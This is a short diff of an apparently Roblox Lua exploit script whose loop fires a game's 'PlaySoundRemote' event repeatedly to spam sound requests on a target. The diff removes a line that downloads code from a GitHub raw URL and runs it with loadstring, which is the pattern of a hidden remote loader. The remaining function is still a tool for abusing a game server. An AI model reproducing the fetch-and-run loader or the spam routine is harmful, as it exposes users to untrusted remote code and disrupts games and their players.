@@ -109,7 +109,6 @@ local function spamSoundRequests(targetPart)
             :WaitForChild('PlaySoundRemote')
             :FireServer(unpack(args))
         wait(0.3)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/cos"))()
         wait(0.1)
     end
 end
